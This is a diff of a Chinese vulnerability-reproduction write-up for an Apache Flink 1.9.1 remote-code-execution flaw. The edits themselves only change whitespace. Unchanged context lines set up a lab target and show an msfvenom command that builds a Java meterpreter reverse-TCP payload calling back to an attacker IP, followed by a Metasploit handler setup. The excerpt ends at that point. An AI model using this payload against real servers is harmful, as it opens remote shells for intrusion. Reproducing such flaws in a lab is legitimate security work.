@@ -3,7 +3,8 @@
 复现版本：Flink 1.9.1
 
 # 0x01 环境搭建
-目标环境：centos7_x64_en-us + flink-1.9.1-bin-scala_2.11.tgz + openjdk version "1.8.0_181"  
+目标环境：centos7_x64_en-us + flink-1.9.1-bin-scala_2.11.tgz + openjdk version "1.8.0_181"
+
 wget https://archive.apache.org/dist/flink/flink-1.9.1/flink-1.9.1-bin-scala_2.11.tgz  
 tar -xvf ./flink-1.9.1-bin-scala_2.11.tgz  
 cd ./flink-1.9.1/bin/  
@@ -20,7 +21,8 @@ cd ./flink-1.9.1/bin/
 Flink <= 1.9.1
 
 # 0x04 漏洞复现
-攻击环境：kali2020 + msf5  
+攻击环境：kali2020 + msf5
+
 msfvenom -p java/meterpreter/reverse_tcp lhost=172.16.35.128 lport=9999 -o text.jar  
 msfconsole  
 use exploit/multi/handler  
